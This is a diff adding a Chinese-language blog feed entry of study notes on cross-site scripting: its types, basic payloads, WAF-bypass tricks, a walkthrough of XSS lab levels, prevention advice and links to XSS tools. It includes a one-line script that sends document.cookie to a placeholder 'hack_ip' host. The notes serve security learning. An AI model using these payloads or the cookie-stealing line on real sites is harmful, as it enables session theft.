@@ -8,7 +8,149 @@
     <author>
       <name>Blank</name>
     </author>
-    <updated>2023-04-11T07:39:25.000Z</updated>
+    <updated>2023-04-12T13:27:07.000Z</updated>
+    <entry>
+        <id>http://example.com/2023/04/12/Internet%20Security/XSS/</id>
+        <title>XSS</title>
+        <link rel="alternate" href="http://example.com/2023/04/12/Internet%20Security/XSS/"/>
+        <content type="html">&lt;h1 id=&#34;XSS&#34;&gt;&lt;a href=&#34;#XSS&#34; class=&#34;headerlink&#34; title=&#34;XSS&#34;&gt;&lt;/a&gt;XSS&lt;/h1&gt;&lt;p&gt;&lt;a name=&#34;b&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;XSS攻击的原理是什么？&#34;&gt;&lt;a href=&#34;#XSS攻击的原理是什么？&#34; class=&#34;headerlink&#34; title=&#34;XSS攻击的原理是什么？&#34;&gt;&lt;/a&gt;XSS攻击的原理是什么？&lt;/h2&gt;&lt;p&gt;​    简单来说就是把用户输入的数据当做前端代码执行。（一般通过js的形式运行）&lt;br&gt;&lt;a name=&#34;b&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;XSS攻击有哪些类型？区别是什么？&#34;&gt;&lt;a href=&#34;#XSS攻击有哪些类型？区别是什么？&#34; class=&#34;headerlink&#34; title=&#34;XSS攻击有哪些类型？区别是什么？&#34;&gt;&lt;/a&gt;XSS攻击有哪些类型？区别是什么？&lt;/h3&gt;&lt;p&gt;&lt;br&gt;&lt;strong&gt;存储型&lt;/strong&gt;:常出现在信息修改添加等地方，导致恶意代码被存储在数据库中，每当被攻击者访问到后就会触发执行；&lt;br&gt;&lt;strong&gt;反射型&lt;/strong&gt;：常出现在url中，一般需要攻击者提前构造好恶意链接，欺骗用户点击，触发攻击代码；&lt;br&gt;&lt;strong&gt;DOM型&lt;/strong&gt;：攻击代码在url中，然后输出在了浏览器的DOM节点中。&lt;br&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDM4NjY2MDY=&#34;&gt;DOM节点&lt;/span&gt;（简单来讲就是文本节点如）&lt;br&gt;&lt;strong&gt;简单比较会发现，存储和反射都经过服务器，而DOM是纯前端。&lt;/strong&gt;&lt;br&gt;&lt;a name=&#34;b&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;常见的XSS攻击&#34;&gt;&lt;a href=&#34;#常见的XSS攻击&#34; class=&#34;headerlink&#34; title=&#34;常见的XSS攻击&#34;&gt;&lt;/a&gt;常见的XSS攻击&lt;/h2&gt;&lt;p&gt;(xss的攻击关键是闭合)&lt;br&gt;1）基本形式&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;js&#34;&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;script&amp;gt;   &amp;lt;script&amp;gt;alert`1`&amp;lt;/script&amp;gt;
+&amp;lt;a href=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt; ###可以不加引号
+&amp;lt;img src=x onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;
+&amp;lt;input onclick=&amp;quot;alert(1)&amp;quot;&amp;gt;  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;绕过防火墙&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;js&#34;&gt;大小写双写       scrIpT scrscriptipt
+注释 //  /**/   &amp;lt;!--&amp;gt;&amp;lt;--&amp;gt; &amp;lt;!--&amp;gt;&amp;lt;--!&amp;gt;
+特殊字符 ſ      有时候可以当成script  == script
+换行            onclick=
+                        alert(1)
+远程js加载      &amp;lt;a href=&amp;quot;http://[access_ip]/xx.js&amp;quot;&amp;gt; 有一个这个网站可以访问的ip(有时可以是本地127.0.0.1）
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;nc 连接&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;js&#34;&gt;&amp;lt;script&amp;gt;var img=document.getElement(&amp;quot;img&amp;quot;);img.src=&amp;quot;http://hack_ip/a?:4444&amp;quot;+escape(document.cookie);&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;a name=&#34;WqnHs&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;注：如果是input型一般不需要加-视情况而论&#34;&gt;&lt;a href=&#34;#注：如果是input型一般不需要加-视情况而论&#34; class=&#34;headerlink&#34; title=&#34;注：如果是input型一般不需要加 视情况而论&#34;&gt;&lt;/a&gt;注：如果是input型一般不需要加&lt;script&gt; &lt;/script&gt;视情况而论&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rlc3QuY3RmOC5jb20vbGV2ZWwxLnBocA==&#34;&gt;以靶场来举例&lt;/span&gt;&lt;br&gt;href不需再加&amp;lt;a href=””        直接输javascript:alert(8)&lt;br&gt;————–&lt;br&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;js&#34;&gt;&amp;gt; 1.level1.php?name=1---------    (简单)&amp;lt;br /&amp;gt;2.level2.  haha&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(5)&amp;lt;/script&amp;gt;//----------------(闭合)&amp;lt;br /&amp;gt;3.(&amp;lt;、&amp;gt;、\)被转意了&amp;lt;br /&amp;gt;F1.haha&amp;#39;onclick=&amp;#39;alert(8)  补全     &amp;#39;&amp;gt;-----------需要按键触发&amp;lt;br /&amp;gt;F2.haha&amp;#39;oninput=&amp;#39;alert(8)           &amp;#39;&amp;gt;-----------需要输入触发&amp;lt;br /&amp;gt;F3.haha&amp;#39;onmouseover=&amp;#39;alert(8)
+
+&amp;gt; 4.同3&amp;lt;br /&amp;gt;5.将&amp;lt;script&amp;gt;替换为&amp;lt;scr_ipt&amp;gt;        on变为o_n&amp;lt;br /&amp;gt;用a标签+伪协议  &amp;lt;br /&amp;gt;aa&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;javascript:alert(8)&amp;quot;&amp;lt;/a&amp;gt;// ------------点击触发&amp;lt;br /&amp;gt;或aa&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;javascript:alert(8)&amp;quot;)&amp;quot;nice&amp;lt;/a&amp;gt;&amp;quot;
+
+&amp;gt; 6.将on----o_n  ,  href---hr_ef   ,script----scr_ipt&amp;lt;br /&amp;gt;直接大写绕过on---On,href----HrEf,script---ScRiPt&amp;lt;br /&amp;gt;如:aa&amp;quot;&amp;gt;&amp;lt;a HrEf=&amp;quot;javasCRipt:alert(8)&amp;quot;&amp;lt;/a&amp;gt;//
+
+&amp;gt; 7.标签script被屏蔽&amp;lt;br /&amp;gt;双写绕过scscriptript
+
+&amp;gt; 8.a标签&amp;lt;a href=&amp;quot;nice try!&amp;quot;&amp;gt;友情链接&amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;center&amp;gt;&amp;lt;img src=level8.jpg&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;br /&amp;gt;且href---hr_ef&amp;lt;br /&amp;gt;有大小写屏蔽&amp;lt;br /&amp;gt;注：有了href就不需加href了---aa&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;javascript:alert(9)&amp;quot;是错的&amp;lt;br /&amp;gt;直接对p进行实体编码(Unicode编码)&amp;lt;br /&amp;gt;javascri&amp;amp;#112;t:alert(8)
+
+&amp;gt; 9.有一个链接合法检测  检测有无关键词http://&amp;lt;br /&amp;gt;对on href script屏蔽&amp;lt;br /&amp;gt;&amp;lt;a href=&amp;quot;您的链接不合法？有没有！&amp;quot;&amp;gt;友情链接&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;a href=&amp;quot;javasc&amp;amp;#114;ipt:alert(8)//http://------用//将http://注释掉
+
+&amp;gt; 10.&amp;amp;t_link=1&amp;amp;t_history=2&amp;amp;t_sort=3       -----(隐藏问题)&amp;lt;br /&amp;gt;看代码找input&amp;lt;br /&amp;gt;&amp;lt;input name=&amp;quot;t_link&amp;quot;  value=&amp;quot;&amp;quot; type=&amp;quot;hidden&amp;quot;&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;input name=&amp;quot;t_history&amp;quot;  value=&amp;quot;&amp;quot; type=&amp;quot;hidden&amp;quot;&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;input name=&amp;quot;t_sort&amp;quot;  value=&amp;quot;3&amp;quot; type=&amp;quot;hidden&amp;quot;&amp;gt;&amp;lt;br /&amp;gt;把type=&amp;quot;hidden&amp;quot;-----type=&amp;quot;&amp;quot;&amp;lt;br /&amp;gt;&amp;amp;t_sort=3&amp;quot; type=&amp;quot;&amp;quot;oninput=&amp;#39;alert(8)&amp;#39;//
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a name=&#34;b&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;XSS攻击如何防范？&#34;&gt;&lt;a href=&#34;#XSS攻击如何防范？&#34; class=&#34;headerlink&#34; title=&#34;XSS攻击如何防范？&#34;&gt;&lt;/a&gt;XSS攻击如何防范？&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;对输入数据进行Html Encode 处理，白名单过滤，过滤JavaScript 事件的标签，开启http-only，装WAF等。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;XSS利用工具&#34;&gt;&lt;a href=&#34;#XSS利用工具&#34; class=&#34;headerlink&#34; title=&#34;XSS利用工具&#34;&gt;&lt;/a&gt;&lt;strong&gt;XSS利用工具&lt;/strong&gt;&lt;/h5&gt;&lt;p&gt;&lt;a name=&#34;b&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;XSSstrike&#34;&gt;&lt;a href=&#34;#XSSstrike&#34; class=&#34;headerlink&#34; title=&#34;XSSstrike&#34;&gt;&lt;/a&gt;XSSstrike&lt;/h2&gt;&lt;h2 id&gt;&lt;a href=&#34;#&#34; class=&#34;headerlink&#34; title&gt;&lt;/a&gt;&lt;img data-src=&#34;https://3.bp.blogspot.com/-O7iiAsYG62A/WrSfaXsBtgI/AAAAAAAAKpw/TXjnhCF-8MUkiqksHFpUnf5LqfyO25fbwCLcBGAs/s1600/XSStrike_6.png&#34; alt=&#34; &#34;&gt;&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;XSStrike 是一个跨站点脚本检测套件，配备了四个手写解析器、一个智能负载生成器、一个强大的模糊引擎和一个速度极快的爬虫。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;XSStrike 不像所有其他工具那样注入有效载荷并检查它是否正常工作，而是使用多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效载荷&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;除此之外，XSStrike 还具有爬虫、模糊测试、参数发现、WAF 检测等功能。它还会扫描 DOM XSS 漏洞。&lt;/p&gt;
+&lt;h1 id=&#34;主要特点：&#34;&gt;&lt;a href=&#34;#主要特点：&#34; class=&#34;headerlink&#34; title=&#34;主要特点：&#34;&gt;&lt;/a&gt;主要特点：&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;反射和 DOM XSS 扫描&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;多线程爬取&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;上下文分析&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;可配置内核&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;WAF检测和规避&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;过时的 JS 库扫描&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;智能载荷发生器&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;手工制作的 HTML 和 JavaScript 解析器&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;强大的模糊引擎&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;盲 XSS 支持&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;高度研究的工作流程&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;完整的 HTTP 支持&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;来自文件的暴力破解有效载荷&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;由&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9QaG90b24=&#34;&gt;Photon&lt;/span&gt;、&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi96ZXRhbml6ZQ==&#34;&gt;Zetanize&lt;/span&gt;和&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9Bcmp1bg==&#34;&gt;Arjun提供支持&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;载荷编码&lt;/p&gt;
+&lt;h4 id=&#34;用法&#34;&gt;&lt;a href=&#34;#用法&#34; class=&#34;headerlink&#34; title=&#34;用法&#34;&gt;&lt;/a&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZS93aWtpL1VzYWdl&#34;&gt;用法&lt;/span&gt;&lt;/h4&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a name=&#34;b&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;XSSPayload&#34;&gt;&lt;a href=&#34;#XSSPayload&#34; class=&#34;headerlink&#34; title=&#34;XSSPayload&#34;&gt;&lt;/a&gt;XSSPayload&lt;/h2&gt;&lt;p&gt;摘自：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gveHNzLXBheWxvYWQtbGlzdA==&#34;&gt;https://github.com/payloadbox/xss-payload-list&lt;/span&gt;&lt;/p&gt;
+&lt;h4 id=&#34;XSS-Vulnerability-Scanner-Tool’s&#34;&gt;&lt;a href=&#34;#XSS-Vulnerability-Scanner-Tool’s&#34; class=&#34;headerlink&#34; title=&#34;XSS Vulnerability Scanner Tool’s :&#34;&gt;&lt;/a&gt;XSS Vulnerability Scanner Tool’s :&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9YU1N0cmlrZQ==&#34;&gt;XSStrike&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NoYXdhcmtoYW5ldGhpY2FsaGFja2VyL0JydXRlWFNT&#34;&gt;BruteXSS Terminal&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JhamVzaG1hanVtZGFyL0JydXRlWFNT&#34;&gt;BruteXSS GUI&lt;/span&gt;&lt;img data-src=&#34;https://netamooz.net/wp-content/uploads/2016/11/215.Brutexss.3.jpg&#34;&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3hzcy1zY2FubmVyLmNvbS8=&#34;&gt;XSS Scanner Online&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5rYWxpLm9yZy93ZWItYXBwbGljYXRpb25zL3hzc2Vy&#34;&gt;XSSer&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0Rhbk1jSW5lcm5leS94c3NjcmFweQ==&#34;&gt;xsscrapy&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Y4YmxpbmsvQ2hyb21pdW0tYmFzZWQtWFNTLVRhaW50LVRyYWNraW5n&#34;&gt;Cyclops&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;参考-：&#34;&gt;&lt;a href=&#34;#参考-：&#34; class=&#34;headerlink&#34; title=&#34;参考 ：&#34;&gt;&lt;/a&gt;参考 ：&lt;/h4&gt;&lt;h6 id=&#34;跨站点脚本-XSS&#34;&gt;&lt;a href=&#34;#跨站点脚本-XSS&#34; class=&#34;headerlink&#34; title=&#34;跨站点脚本 (XSS)&#34;&gt;&lt;/a&gt;跨站点脚本 (XSS)&lt;/h6&gt;&lt;ul&gt;
+&lt;li&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9Dcm9zcy1zaXRlX1NjcmlwdGluZ18oWFNTKQ==&#34;&gt;https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6 id=&#34;XSS（跨站点脚本）预防备忘单&#34;&gt;&lt;a href=&#34;#XSS（跨站点脚本）预防备忘单&#34; class=&#34;headerlink&#34; title=&#34;XSS（跨站点脚本）预防备忘单&#34;&gt;&lt;/a&gt;XSS（跨站点脚本）预防备忘单&lt;/h6&gt;&lt;ul&gt;
+&lt;li&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9YU1NfKENyb3NzX1NpdGVfU2NyaXB0aW5nKV9QcmV2ZW50aW9uX0NoZWF0X1NoZWV0&#34;&gt;https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6 id=&#34;基于-DOM-的-XSS-预防备忘单&#34;&gt;&lt;a href=&#34;#基于-DOM-的-XSS-预防备忘单&#34; class=&#34;headerlink&#34; title=&#34;基于 DOM 的 XSS 预防备忘单&#34;&gt;&lt;/a&gt;基于 DOM 的 XSS 预防备忘单&lt;/h6&gt;&lt;ul&gt;
+&lt;li&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9ET01fYmFzZWRfWFNTX1ByZXZlbnRpb25fQ2hlYXRfU2hlZXQ=&#34;&gt;https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6 id=&#34;反射跨站点脚本测试-OTG-INPVAL-001&#34;&gt;&lt;a href=&#34;#反射跨站点脚本测试-OTG-INPVAL-001&#34; class=&#34;headerlink&#34; title=&#34;反射跨站点脚本测试 (OTG-INPVAL-001)&#34;&gt;&lt;/a&gt;反射跨站点脚本测试 (OTG-INPVAL-001)&lt;/h6&gt;&lt;ul&gt;
+&lt;li&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9SZWZsZWN0ZWRfQ3Jvc3Nfc2l0ZV9zY3JpcHRpbmdfKE9URy1JTlBWQUwtMDAxKQ==&#34;&gt;https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6 id=&#34;测试存储的跨站点脚本-OTG-INPVAL-002&#34;&gt;&lt;a href=&#34;#测试存储的跨站点脚本-OTG-INPVAL-002&#34; class=&#34;headerlink&#34; title=&#34;测试存储的跨站点脚本 (OTG-INPVAL-002)&#34;&gt;&lt;/a&gt;测试存储的跨站点脚本 (OTG-INPVAL-002)&lt;/h6&gt;&lt;ul&gt;
+&lt;li&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9TdG9yZWRfQ3Jvc3Nfc2l0ZV9zY3JpcHRpbmdfKE9URy1JTlBWQUwtMDAyKQ==&#34;&gt;https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6 id=&#34;测试基于-DOM-的跨站点脚本-OTG-CLIENT-001&#34;&gt;&lt;a href=&#34;#测试基于-DOM-的跨站点脚本-OTG-CLIENT-001&#34; class=&#34;headerlink&#34; title=&#34;测试基于 DOM 的跨站点脚本 (OTG-CLIENT-001)&#34;&gt;&lt;/a&gt;测试基于 DOM 的跨站点脚本 (OTG-CLIENT-001)&lt;/h6&gt;&lt;ul&gt;
+&lt;li&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9ET00tYmFzZWRfQ3Jvc3Nfc2l0ZV9zY3JpcHRpbmdfKE9URy1DTElFTlQtMDAxKQ==&#34;&gt;https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6 id=&#34;基于-DOM-的-XSS&#34;&gt;&lt;a href=&#34;#基于-DOM-的-XSS&#34; class=&#34;headerlink&#34; title=&#34;基于 DOM 的 XSS&#34;&gt;&lt;/a&gt;基于 DOM 的 XSS&lt;/h6&gt;&lt;ul&gt;
+&lt;li&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9ET01fQmFzZWRfWFNT&#34;&gt;https://www.owasp.org/index.php/DOM_Based_XSS&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6 id=&#34;跨站点脚本-XSS-备忘单-维拉代码&#34;&gt;&lt;a href=&#34;#跨站点脚本-XSS-备忘单-维拉代码&#34; class=&#34;headerlink&#34; title=&#34;跨站点脚本 (XSS) 备忘单 | 维拉代码&#34;&gt;&lt;/a&gt;跨站点脚本 (XSS) 备忘单 | 维拉代码&lt;/h6&gt;&lt;ul&gt;
+&lt;li&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmVyYWNvZGUuY29tL3NlY3VyaXR5L3hzcw==&#34;&gt;https://www.veracode.com/security/xss&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;推荐书籍：&#34;&gt;&lt;a href=&#34;#推荐书籍：&#34; class=&#34;headerlink&#34; title=&#34;推荐书籍：&#34;&gt;&lt;/a&gt;推荐书籍：&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ib29rcy5nb29nbGUuY29tLnRyL2Jvb2tzL2Fib3V0L1hTU19BdHRhY2tzLmh0bWw/aWQ9ZFBocURlMFdIWjhD&#34;&gt;XSS 攻击：跨站脚本利用与防御&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWFucHViLmNvbS94c3M=&#34;&gt;XSS 备忘单&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;克隆现有存储库（使用-HTTPS-克隆）&#34;&gt;&lt;a href=&#34;#克隆现有存储库（使用-HTTPS-克隆）&#34; class=&#34;headerlink&#34; title=&#34;克隆现有存储库（使用 HTTPS 克隆）&#34;&gt;&lt;/a&gt;克隆现有存储库（使用 HTTPS 克隆）&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;root@ismailtasdelen:~# git clone https://github.com/ismailtasdelen/xss-payload-list.git
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;克隆现有存储库（使用-SSH-克隆）&#34;&gt;&lt;a href=&#34;#克隆现有存储库（使用-SSH-克隆）&#34; class=&#34;headerlink&#34; title=&#34;克隆现有存储库（使用 SSH 克隆）&#34;&gt;&lt;/a&gt;克隆现有存储库（使用 SSH 克隆）&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;root@ismailtasdelen:~# git clone git@github.com:ismailtasdelen/xss-payload-list.git
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;跨站漏洞的区别&lt;br&gt;&lt;a name=&#34;b&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;1-2-4-XSS-CSRF和SSRF区别是什么？&#34;&gt;&lt;a href=&#34;#1-2-4-XSS-CSRF和SSRF区别是什么？&#34; class=&#34;headerlink&#34; title=&#34;1.2.4 XSS,CSRF和SSRF区别是什么？&#34;&gt;&lt;/a&gt;1.2.4 XSS,CSRF和SSRF区别是什么？&lt;/h3&gt;&lt;p&gt;&lt;br&gt;  &lt;strong&gt;XSS&lt;/strong&gt;：跨站脚本攻击；&lt;br&gt;&amp;gt; &lt;strong&gt;CSRF&lt;/strong&gt;：跨站请求伪造脚本攻击；&lt;br&gt;&lt;strong&gt;SSRF&lt;/strong&gt;：服务器请求伪造攻击。&lt;br&gt;区别：&lt;br&gt;&lt;strong&gt;XSS&lt;/strong&gt;：XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的 脚本语句被执行。&lt;br&gt;&lt;strong&gt;CSRF&lt;/strong&gt;：CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以 利用用户的Cookie信息伪造用户请求发送至服务器。&lt;br&gt;&lt;strong&gt;SSRF&lt;/strong&gt;：SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。&lt;/p&gt;
+</content>
+        <category term="网安" scheme="http://example.com/categories/%E7%BD%91%E5%AE%89/" />
+        <category term="Top10" scheme="http://example.com/tags/Top10/" />
+        <updated>2023-04-12T13:27:07.000Z</updated>
+    </entry>
     <entry>
         <id>http://example.com/2023/04/11/Internet%20Security/OSINT/</id>
         <title>OSINT</title>
@@ -27,7 +169,7 @@
 &lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oYXZlaWJlZW5wd25lZC5jb20v&#34;&gt;Have I Been Pwned &lt;/span&gt;&lt;ul&gt;
 &lt;li&gt;只需输入您的电子邮件地址即可检查您的个人信息是否已被泄露&lt;br&gt;&lt;img data-src=&#34;1.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
 &lt;li&gt;并且当未来发生 pwnage 并且您的帐户被盗用时，您会收到通知。&lt;br&gt;&lt;img data-src=&#34;2.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
-&lt;li&gt;还能进行域名搜索&lt;br&gt;（在整个域中搜索被盗用的帐户并接收未来的通知）&lt;br&gt; &lt;img data-src=&#34;3.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
+&lt;li&gt;还能进行域名搜索&lt;br&gt;（在整个域中搜索被盗用的帐户并接收未来的通知）&lt;br&gt;  &lt;img data-src=&#34;3.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
 &lt;li&gt;还会显示一些违规网站&lt;br&gt;&lt;img data-src=&#34;5.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
 &lt;li&gt;还能查看密码是否安全&lt;br&gt;&lt;img data-src=&#34;6.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
 &lt;li&gt;还提供了一些API(当然需要$)&lt;/li&gt;
@@ -61,7 +203,6 @@
 &lt;/ol&gt;
 &lt;/blockquote&gt;
 &lt;pre&gt;&lt;code&gt;  他们有一个简单的搜索栏，可让在他们的数据库中搜索用户名、电子邮件、加密地址、昵称、真实姓名或网站。鉴于数据库的大小，搜索会很慢，但它是即时的。完全免费的大量诈骗份子数据！由于其众包性质，还鼓励用户使用其服务来举报诈骗者。许多OSINT研究人员和反诈骗社区使用这些数据来瞄准诈骗者并阻碍他们的诈骗工作。
-  
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt; &lt;img data-src=&#34;10.png&#34; alt=&#34; &#34;&gt;&lt;/p&gt;
 &lt;blockquote&gt;
@@ -74,25 +215,24 @@
 &lt;/blockquote&gt;
 &lt;blockquote&gt;
 &lt;ol start=&#34;6&#34;&gt;
-&lt;li&gt;Spiderfoot&lt;br&gt;[下载地址]（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NtaWNhbGxlZi9zcGlkZXJmb290P3JlZj1kJUVGJUJDJTg5&#34;&gt;https://github.com/smicallef/spiderfoot?ref=d）&lt;/span&gt;&lt;br&gt;&lt;img data-src=&#34;11.png&#34; alt=&#34; &#34;&gt;&lt;img data-src=&#34;12.png&#34; alt=&#34; &#34;&gt;&lt;ul&gt;
